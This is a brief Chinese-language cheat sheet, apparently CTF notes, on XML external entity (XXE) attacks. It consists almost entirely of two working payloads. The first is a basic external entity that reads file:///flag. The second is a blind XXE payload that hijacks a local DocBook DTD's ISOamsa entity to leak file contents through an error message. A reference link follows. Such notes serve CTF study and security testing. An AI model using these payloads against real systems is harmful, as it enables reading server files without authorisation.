# XXE

外部实体

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
 <!ENTITY xxe SYSTEM "file:///flag">
 ]>

 <userInfo>
  <name>&xxe;</name>
 </userInfo>
```


Blind-XXE 引用本地DTD
利用 ISOamsa

```xml
<?xml version="1.0" ?>
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
<!ENTITY % ISOamsa '
        <!ENTITY &#x25; file SYSTEM "file:///flag">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
'>
    %local_dtd;
]
```

## 参考资料

https://xz.aliyun.com/t/3357